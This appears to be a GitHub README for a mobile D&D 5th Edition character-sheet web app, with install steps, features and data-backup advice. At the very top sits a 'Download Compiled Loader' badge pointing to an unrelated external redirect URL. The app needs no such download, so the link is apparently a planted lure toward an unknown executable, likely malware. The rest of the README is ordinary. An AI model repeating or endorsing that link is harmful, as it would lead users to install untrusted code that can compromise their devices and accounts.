# Chronicle Mobile — D&D 5e Character Sheet (PWA)

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

A mobile-friendly Progressive Web App version of Chronicle — a D&D 5th Edition character sheet that runs entirely in your browser. Installable on both Android and iPhone directly from the browser, no app store required.

## 🌐 Live App

👉 [Open Chronicle Mobile](https://animatroniofry.github.io/Chronicle-Mobile/)

## 📱 How to Install on Your Phone

**Android (Chrome):**
1. Open the link above in Chrome
2. Tap the menu (three dots) → "Add to Home Screen"
3. Tap "Install"

**iPhone (Safari):**
1. Open the link above in Safari
2. Tap the Share button → "Add to Home Screen"
3. Tap "Add"

The app will appear on your home screen like a native app and works offline after the first load.

## ✨ Features

- Full character sheet (ability scores, skills, saving throws, conditions)
- Battle Tracker with initiative order and HP management
- Spellbook with full spell database, upcasting support, and multiclass slot calculator
- Equipment, inventory, encumbrance tracking, and currency
- Interactive in-game calendar (Forgotten Realms, Greyhawk, Standard)
- Dice roller with roll history
- Notes & Journal (NPCs, quests, lore, bestiary)
- Companions, familiars, mounts with full stat blocks
- Wild Shape tracker for Druids
- 100+ unlockable Achievements
- Animated and seasonal themes
- Floating Combat HUD for fast mid-combat access

## 💾 Your Data

All data is saved automatically in your browser's local storage. Use **Export** to back up your character as a `.json` file and **Import** to restore it.

> ⚠️ Clearing your browser's site data will erase your character. Export regularly!
